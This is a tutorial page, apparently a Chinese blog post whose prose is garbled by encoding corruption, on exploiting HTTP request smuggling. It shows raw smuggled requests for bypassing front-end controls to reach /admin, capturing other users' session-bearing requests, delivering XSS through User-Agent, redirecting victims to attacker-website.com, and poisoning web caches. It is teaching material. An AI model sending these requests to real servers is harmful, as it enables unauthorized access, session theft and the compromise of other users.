<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>62</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/admin</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> xGET <span class="symbol">/home</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br></pre></td></tr></table></figure></div>

<p>å‰ç«¯æœåŠ¡å™¨åœ¨æ­¤å¤„çœ‹åˆ°ä¸¤ä¸ªè¯·æ±‚ï¼Œä¸¤ä¸ªè¯·æ±‚éƒ½æ˜¯é’ˆå¯¹ &#x2F;homeçš„ï¼Œå› æ­¤è¿™äº›è¯·æ±‚è¢«è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œåç«¯æœåŠ¡å™¨ä¼šçœ‹åˆ°ä¸€ä¸ª &#x2F;home è¯·æ±‚å’Œä¸€ä¸ª &#x2F;admin è¯·æ±‚ã€‚å®ƒå‡å®šï¼ˆä¸€å¦‚æ—¢å¾€ï¼‰è¯·æ±‚å·²é€šè¿‡å‰ç«¯æ§ä»¶ï¼Œå› æ­¤æˆäºˆå¯¹å—é™ URL çš„è®¿é—®æƒé™ã€‚</p>
<h2 id="æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™"><a href="#æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™" class="headerlink" title="æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™"></a>æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™</h2><p>åœ¨è®¸å¤šåº”ç”¨ç¨‹åºä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨åœ¨å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ä¹‹å‰ä¼šæ‰§è¡Œä¸€äº›è¯·æ±‚é‡å†™ï¼Œé€šå¸¸æ˜¯é€šè¿‡æ·»åŠ ä¸€äº›é¢å¤–çš„è¯·æ±‚æ ‡å¤´ã€‚ä¾‹å¦‚ï¼Œå‰ç«¯æœåŠ¡å™¨å¯èƒ½ï¼š</p>
<ul>
<li>ç»ˆæ­¢ TLS è¿æ¥å¹¶æ·»åŠ ä¸€äº›æè¿°æ‰€ç”¨åè®®å’Œå¯†ç çš„æ ‡å¤´;</li>
<li>æ·»åŠ åŒ…å«ç”¨æˆ· IP åœ°å€çš„ X-Forwarded-For æ ‡å¤´;</li>
<li>æ ¹æ®ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰Œç¡®å®šç”¨æˆ·çš„ IDï¼Œå¹¶æ·»åŠ æ ‡è¯†ç”¨æˆ·çš„æ ‡å¤´;</li>
<li>æ·»åŠ ä¸€äº›å…¶ä»–æ”»å‡»æ„Ÿå…´è¶£çš„æ•æ„Ÿä¿¡æ¯ã€‚</li>
</ul>
<p>å‡è®¾åº”ç”¨ç¨‹åºå…·æœ‰åæ˜  email å‚æ•°å€¼çš„ login å‡½æ•°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">email</span>=wiener@normal-user.net</span></span><br></pre></td></tr></table></figure></div>
<p>ç”Ÿæˆçš„å†…å®¹å“åº”</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;email&quot;</span> <span class="attribute">value</span>=<span class="string">&quot;wiener@normal-user.net&quot;</span> <span class="attribute">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥ç”¨ä¸‹é¢çš„æ”»å‡»æ­ç¤ºå‰ç«¯æœåŠ¡å™¨æ‰§è¡Œçš„é‡å†™ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>130</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">POST <span class="symbol">/login</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">100</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">email</span><span class="operator">=</span>POST <span class="symbol">/login</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br><span class="line"><span class="language-nix">...</span></span><br></pre></td></tr></table></figure></div>
<p>å‰ç«¯æœåŠ¡å™¨å°†é‡å†™è¯·æ±‚ä»¥åŒ…å«å…¶ä»–æ ‡å¤´ï¼Œç„¶ååç«¯æœåŠ¡å™¨å°†å¤„ç†èµ°ç§è¯·æ±‚ï¼Œå¹¶å°†é‡å†™çš„ç¬¬äºŒä¸ªè¯·æ±‚è§†ä¸º email å‚æ•°çš„å€¼ã€‚ç„¶åï¼Œå®ƒä¼šåœ¨å¯¹ç¬¬äºŒä¸ªè¯·æ±‚çš„å“åº”ä¸­åæ˜ æ­¤å€¼ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NESTEDTEXT"><figure class="iseeu highlight /nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">&lt;input id=&quot;email&quot; value=&quot;POST /login HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">:</span> <span class="string">vulnerable-website.com</span></span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">:</span> <span class="string">1.3.3.7</span></span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">:</span> <span class="string">https</span></span><br><span class="line"><span class="attribute">X-TLS-Bits</span><span class="punctuation">:</span> <span class="string">128</span></span><br><span class="line"><span class="attribute">X-TLS-Cipher</span><span class="punctuation">:</span> <span class="string">ECDHE-RSA-AES128-GCM-SHA256</span></span><br><span class="line"><span class="attribute">X-TLS-Version</span><span class="punctuation">:</span> <span class="string">TLSv1.2</span></span><br><span class="line"><span class="attribute">x-nr-external-service</span><span class="punctuation">:</span> <span class="string">external</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>ä¸€æ—¦æ­ç¤ºäº†å‰ç«¯æœåŠ¡å™¨å¦‚ä½•é‡å†™è¯·æ±‚ï¼Œå°±å¯ä»¥å¯¹èµ°ç§è¯·æ±‚åº”ç”¨å¿…è¦çš„é‡å†™ï¼Œä»¥ç¡®ä¿åç«¯æœåŠ¡å™¨æŒ‰é¢„æœŸæ–¹å¼å¤„ç†è¿™äº›è¯·æ±‚ã€‚</p>
<h2 id="ç»•è¿‡å®¢æˆ·ç«¯èº«ä»½éªŒè¯"><a href="#ç»•è¿‡å®¢æˆ·ç«¯èº«ä»½éªŒè¯" class="headerlink" title="ç»•è¿‡å®¢æˆ·ç«¯èº«ä»½éªŒè¯"></a>ç»•è¿‡å®¢æˆ·ç«¯èº«ä»½éªŒè¯</h2><p>ä½œä¸º TLS æ¡æ‰‹çš„ä¸€éƒ¨åˆ†ï¼ŒæœåŠ¡å™¨é€šè¿‡æä¾›è¯ä¹¦å‘å®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯æµè§ˆå™¨ï¼‰éªŒè¯è‡ªèº«èº«ä»½ã€‚æ­¤è¯ä¹¦åŒ…å«å…¶â€œå…¬ç”¨åâ€ï¼ˆCNï¼‰ï¼Œè¯¥åç§°åº”ä¸å…¶æ³¨å†Œçš„ä¸»æœºååŒ¹é…ã€‚ç„¶åï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨å®ƒæ¥éªŒè¯ä»–ä»¬æ˜¯å¦æ­£åœ¨ä¸å±äºé¢„æœŸåŸŸçš„åˆæ³•æœåŠ¡å™¨é€šä¿¡ã€‚</p>
<p>ä¸€äº›ç«™ç‚¹æ›´è¿›ä¸€æ­¥ï¼Œå®ç°äº†ä¸€ç§ç›¸äº’ TLS èº«ä»½éªŒè¯å½¢å¼ï¼Œå…¶ä¸­å®¢æˆ·ç«¯è¿˜å¿…é¡»å‘æœåŠ¡å™¨æä¾›è¯ä¹¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯çš„ CN é€šå¸¸æ˜¯ç”¨æˆ·åæˆ–ç±»ä¼¼çš„ä¸œè¥¿ï¼Œä¾‹å¦‚ï¼Œå®ƒå¯ä»¥ä½œä¸ºè®¿é—®æ§åˆ¶æœºåˆ¶çš„ä¸€éƒ¨åˆ†åœ¨åç«¯åº”ç”¨ç¨‹åºé€»è¾‘ä¸­ä½¿ç”¨ã€‚</p>
<p>å¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯çš„ç»„ä»¶é€šå¸¸é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªéæ ‡å‡† HTTP æ ‡å¤´å°†ç›¸å…³è¯¦ç»†ä¿¡æ¯ä»è¯ä¹¦ä¼ é€’åˆ°åº”ç”¨ç¨‹åºæˆ–åç«¯æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå‰ç«¯æœåŠ¡å™¨æœ‰æ—¶ä¼šå°†åŒ…å«å®¢æˆ·ç«¯ CN çš„æ ‡å¤´é™„åŠ åˆ°ä»»ä½•ä¼ å…¥è¯·æ±‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">X-SSL-CLIENT-CN</span><span class="punctuation">: </span>carlos</span><br></pre></td></tr></table></figure></div>

<h2 id="æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚"><a href="#æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚" class="headerlink" title="æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚"></a>æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚</h2><p>å¦‚æœåº”ç”¨ç¨‹åºåŒ…å«ä»»ä½•ç±»å‹çš„åŠŸèƒ½ï¼Œå…è®¸ å­˜å‚¨å’Œç¨åæ£€ç´¢æ–‡æœ¬æ•°æ®ï¼Œåˆ™å¯èƒ½ä¼šä½¿ç”¨å®ƒæ¥æ•è·å…¶ä»–ç”¨æˆ·è¯·æ±‚çš„å†…å®¹ã€‚è¿™äº›å¯èƒ½åŒ…æ‹¬ç”¨æˆ·æäº¤çš„ä¼šè¯ä»¤ç‰Œæˆ–å…¶ä»–æ•æ„Ÿæ•°æ®ã€‚ç”¨ä½œæ­¤æ”»å‡»å·¥å…·çš„åˆé€‚åŠŸèƒ½æ˜¯è¯„è®ºã€ç”µå­é‚®ä»¶ã€é…ç½®æ–‡ä»¶æè¿°ã€å±å¹•åç§°ç­‰ã€‚</p>
<p>è¦æ‰§è¡Œæ”»å‡»ï¼Œ éœ€è¦èµ°ç§ä¸€ä¸ªå°†æ•°æ®æäº¤åˆ° storage å‡½æ•°çš„è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«è¦å­˜å‚¨çš„æ•°æ®çš„å‚æ•°ä½äºè¯·æ±‚çš„æœ€åã€‚ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºä½¿ç”¨ä»¥ä¸‹è¯·æ±‚æäº¤åšå®¢æ–‡ç« è¯„è®ºï¼Œè¯¥è¯„è®ºå°†è¢«å­˜å‚¨å¹¶æ˜¾ç¤ºåœ¨åšå®¢ä¸Šï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post/comment</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>154</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=<span class="number">2</span>&amp;comment=My+comment&amp;name=Carlos+Montoya&amp;email=carlos%<span class="number">40</span>normal-user.net&amp;website=https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fnormal-user.net</span></span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨è€ƒè™‘ä¸€ä¸‹ï¼Œå¦‚æœ èµ°ç§ä¸€ä¸ªç­‰æ•ˆè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«è¿‡é•¿çš„ Content-Length æ ‡å¤´ï¼Œå¹¶ä¸” comment å‚æ•°ä½äºè¯·æ±‚æœ«å°¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>330</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /post/comment HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: vulnerable-website.com</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">400</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Cookie</span>: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=<span class="number">2</span>&amp;name=Carlos+Montoya&amp;email=carlos%<span class="number">40</span>normal-user.net&amp;website=https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fnormal-user.net&amp;comment=</span></span><br></pre></td></tr></table></figure></div>
<p>èµ°ç§è¯·æ±‚çš„ Content-Length æ ‡å¤´æŒ‡ç¤ºæ­£æ–‡é•¿åº¦ä¸º 400 å­—èŠ‚ï¼Œä½†æˆ‘ä»¬åªå‘é€äº† 144 å­—èŠ‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåç«¯æœåŠ¡å™¨å°†ç­‰å¾…å‰©ä½™çš„ 256 å­—èŠ‚ï¼Œç„¶åå†å‘å‡ºå“åº”ï¼Œæˆ–è€…å¦‚æœå“åº”é€Ÿåº¦ä¸å¤Ÿå¿«ï¼Œåˆ™ä¼šå‘å‡ºè¶…æ—¶ã€‚å› æ­¤ï¼Œå½“é€šè¿‡åŒä¸€è¿æ¥å°†å¦ä¸€ä¸ªè¯·æ±‚å‘é€åˆ°åç«¯æœåŠ¡å™¨æ—¶ï¼Œå‰ 256 å­—èŠ‚å°†æœ‰æ•ˆåœ°é™„åŠ åˆ°èµ°ç§è¯·æ±‚ä¸­</p>
<p>è¦æ•è·å—å®³è€…çš„æ›´å¤šè¯·æ±‚ï¼Œ åªéœ€ç›¸åº”åœ°å¢åŠ èµ°ç§è¯·æ±‚çš„ Content-Length æ ‡å¤´çš„å€¼ï¼Œä½†è¯·æ³¨æ„ï¼Œè¿™å°†æ¶‰åŠä¸€å®šé‡çš„è¯•éªŒå’Œé”™è¯¯ã€‚å¦‚æœ é‡åˆ°è¶…æ—¶ï¼Œè¿™å¯èƒ½æ„å‘³ç€ æŒ‡å®šçš„ Content-Length é«˜äºå—å®³è€…è¯·æ±‚çš„å®é™…é•¿åº¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªéœ€å‡å°è¯¥å€¼ï¼Œç›´åˆ°æ”»å‡»å†æ¬¡èµ·ä½œç”¨ã€‚</p>
<h2 id="åˆ©ç”¨åå°„å‹XSS"><a href="#åˆ©ç”¨åå°„å‹XSS" class="headerlink" title="åˆ©ç”¨åå°„å‹XSS"></a>åˆ©ç”¨åå°„å‹XSS</h2><p>å¦‚æœåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ° HTTP è¯·æ±‚èµ°ç§çš„æ”»å‡»ï¼Œå¹¶ä¸”è¿˜åŒ…å«åå°„å‹ XSSï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¯·æ±‚èµ°ç§æ”»å‡»æ¥æ”»å‡»åº”ç”¨ç¨‹åºçš„å…¶ä»–ç”¨æˆ·ã€‚è¿™ç§æ–¹æ³•åœ¨ä¸¤ä¸ªæ–¹é¢ä¼˜äºå¯¹åå°„å‹ XSS çš„æ­£å¸¸åˆ©ç”¨ï¼š<br>å®ƒä¸éœ€è¦ä¸å—å®³è€…ç”¨æˆ·äº¤äº’ã€‚ æ— éœ€å‘ä»–ä»¬æä¾› URL å¹¶ç­‰å¾…ä»–ä»¬è®¿é—®å®ƒã€‚ åªéœ€èµ°ç§ä¸€ä¸ªåŒ…å« XSS æœ‰æ•ˆè´Ÿè½½çš„è¯·æ±‚ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·è¯·æ±‚å°±ä¼šè¢«å‘½ä¸­ã€‚<br>å®ƒå¯ç”¨äºåˆ©ç”¨è¯·æ±‚ä¸­åœ¨æ­£å¸¸åå°„å‹ XSS æ”»å‡»ä¸­æ— æ³•è½»æ¾æ§åˆ¶çš„éƒ¨åˆ†çš„ XSS è¡Œä¸ºï¼Œä¾‹å¦‚ HTTP è¯·æ±‚æ ‡å¤´ã€‚<br>ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºåœ¨ User-Agent æ ‡å¤´ä¸­å…·æœ‰åå°„çš„ XSS æ¼æ´ã€‚ å¯ä»¥åœ¨è¯·æ±‚èµ°ç§æ”»å‡»ä¸­åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">User-Agent:</span> <span class="symbol">&lt;script&gt;</span>alert(<span class="number">1</span>)<span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> X</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å°†ç°åœºé‡å®šå‘è½¬æ¢ä¸ºå¼€æ”¾é‡å®šå‘"><a href="#å°†ç°åœºé‡å®šå‘è½¬æ¢ä¸ºå¼€æ”¾é‡å®šå‘" class="headerlink" title="å°†ç°åœºé‡å®šå‘è½¬æ¢ä¸ºå¼€æ”¾é‡å®šå‘"></a>å°†ç°åœºé‡å®šå‘è½¬æ¢ä¸ºå¼€æ”¾é‡å®šå‘</h2><p>ä¸€ä¸ªé‡å®šå‘è¯·æ±‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span></span><br></pre></td></tr></table></figure></div>

<p>æ­¤è¡Œä¸ºé€šå¸¸è¢«è®¤ä¸ºæ˜¯æ— å®³çš„ï¼Œä½†å¯ä»¥åœ¨è¯·æ±‚èµ°ç§æ”»å‡»ä¸­è¢«åˆ©ç”¨ï¼Œå°†å…¶ä»–ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨åŸŸã€‚ä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/home</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> X</span></span><br></pre></td></tr></table></figure></div>
<p>èµ°ç§çš„è¯·æ±‚ä¼šè§¦å‘é‡å®šå‘åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œè¿™å°†å½±å“åˆ°åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker-website.com</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span></span><br></pre></td></tr></table></figure></div>
<h2 id="ä½¿ç”¨-HTTP-è¯·æ±‚èµ°ç§æ‰§è¡Œ-Web-ç¼“å­˜ä¸­æ¯’"><a href="#ä½¿ç”¨-HTTP-è¯·æ±‚èµ°ç§æ‰§è¡Œ-Web-ç¼“å­˜ä¸­æ¯’" class="headerlink" title="ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ‰§è¡Œ Web ç¼“å­˜ä¸­æ¯’"></a>ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ‰§è¡Œ Web ç¼“å­˜ä¸­æ¯’</h2><p>åœ¨ä¸Šè¿°æ”»å‡»çš„å˜ä½“ä¸­ï¼Œæœ‰å¯èƒ½åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ¥æ‰§è¡Œ Web ç¼“å­˜ä¸­æ¯’æ”»å‡»ã€‚å¦‚æœå‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•éƒ¨åˆ†æ‰§è¡Œå†…å®¹ç¼“å­˜ï¼ˆé€šå¸¸æ˜¯å‡ºäºæ€§èƒ½åŸå› ï¼‰ï¼Œåˆ™å¯èƒ½ä¼šä½¿ç”¨åœºå¤–é‡å®šå‘å“åº”æ¥æ¯’å®³ç¼“å­˜ã€‚è¿™å°†ä½¿æ”»å‡»æŒç»­å­˜åœ¨ï¼Œå½±å“éšåè¯·æ±‚å—å½±å“ URL çš„ä»»ä½•ç”¨æˆ·ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/home</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> XGET <span class="symbol">/static/include.js</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> vulnerable-website.com</span></span><br></pre></td></tr></table></figure></div>
<p>èµ°ç§è¯·æ±‚åˆ°è¾¾åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨åƒä»¥å‰ä¸€æ ·ä½¿ç”¨åœºå¤–é‡å®šå‘è¿›è¡Œå“åº”ã€‚å‰ç«¯æœåŠ¡å™¨æ ¹æ®å®ƒè®¤ä¸ºæ˜¯ç¬¬äºŒä¸ªè¯·æ±‚ä¸­çš„ URLï¼ˆå³ &#x2F;static&#x2F;include.jsï¼‰ç¼“å­˜æ­¤å“åº”ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span></span><br></pre></td></tr></table></figure></div>

